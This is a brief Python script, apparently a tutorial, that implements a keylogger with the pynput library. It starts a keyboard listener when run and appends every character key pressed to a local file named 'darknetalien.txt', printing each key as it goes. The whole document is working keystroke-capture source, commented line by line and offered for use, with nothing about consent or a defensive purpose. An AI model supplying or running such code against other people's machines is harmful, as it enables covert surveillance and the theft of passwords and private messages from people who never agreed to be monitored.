#First install pynput by typing <pip install pynput> into the terminal
from pynput import keyboard #Import the keyboard package from pynput library

def keyPressed(key): #defining the keyPressed function
    print(str(key))
    with open("darknetalien.txt", 'a')as logKey: #takes all logged key inputs and appends them to the txt document named "darknetalien.txt"
        try:
            char = key.char
            logKey.write(char)
        except:  
            print("Error getting char")   #if the key input is not a character, returns an error message 

if __name__ == "__main__": #logging automatically starts when the program is run
    listener = keyboard.Listener(on_press=keyPressed) #assigns key inputs to the listener object
    listener.start() 
    input()
